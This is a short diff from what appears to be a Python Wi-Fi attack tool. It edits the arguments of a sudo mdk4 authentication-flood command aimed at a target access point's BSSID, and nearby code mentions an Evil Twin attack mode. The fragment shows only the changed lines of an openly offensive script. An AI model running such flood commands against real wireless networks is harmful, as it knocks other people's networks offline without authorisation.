@@ -451,7 +451,7 @@ def attack_func(network_interface, attack_mode):
         get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
         get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
         os.system(
-            f"xterm -hold -e sudo mdk4 {network_interface} a -a -i {access_bssid}")
+            f"xterm -hold -e sudo mdk4 {network_interface} a -a {access_bssid}")
         quit_program()
     # Evil Twin Attack
     elif attack_mode == "ETwin":
